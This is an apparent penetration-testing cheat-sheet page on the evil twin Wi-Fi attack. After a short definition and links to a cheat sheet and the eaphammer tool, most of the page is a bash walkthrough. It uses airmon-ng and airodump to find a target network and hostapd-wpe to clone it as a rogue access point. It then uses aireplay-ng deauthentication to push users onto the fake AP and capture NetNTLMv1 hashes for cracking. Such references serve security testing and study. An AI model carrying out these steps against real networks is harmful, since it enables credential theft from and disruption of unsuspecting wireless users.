# 👹 EvilTwin

{% hint style="info" %}
An evil twin is a **fraudulent Wi-Fi access point** that appears to be legitimate but is set up to eavesdrop on wireless communications.&#x20;

The evil twin is the wireless LAN equivalent of the **phishing** scam.
{% endhint %}

{% embed url="https://cheatsheet.haax.fr/wireless/rogue_ap#evil-twin-attack" %}
Evil Twin CheatSheet - Source
{% endembed %}

{% embed url="https://github.com/s0lst1c3/eaphammer" %}
Tool for Evil Twin
{% endembed %}

```bash
# 1/ Start monitoring mode
# If you plan to use deauth attack, connect the 2 eth interfaces at the same time
# To avoid having wlan0mon and wlan0 (it can conflict)
sudo airmon-ng start wlan0

# 2/ If process are blocking the monitoring mode, kill them
sudo airmon-ng check kill
sudo kill <PID>

# 3/ Get the target AP (ESSID)
# Your target can have multiples AP, and so multiples MAC addresses
# They can run on differents channels
sudo airodump wlan0mon

# 4/ Then set the target in the configuration file
sudo nano /etc/hostapd-wpe/hostapd-wpe.conf
ssid=<ESSID>

# 5/ Start AP
# You will only get people that newly connects to the target AP
# If you want to get people already connected, you need to push the attack further with deauth
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 6/ Start the second ethernet interface
sudo airmon-ng start wlan1

# 7/ Deauth (In another terminal)
# Based on the differents ESSID and channels found in step 3
# -0 is the number of deauth packet sent
sudo aireplay-ng -0 10 -a <mac address> -c <channel>

# Then wait for credz \o/
# You will probably get NetNTLMv1 hashes you will need to crack
```
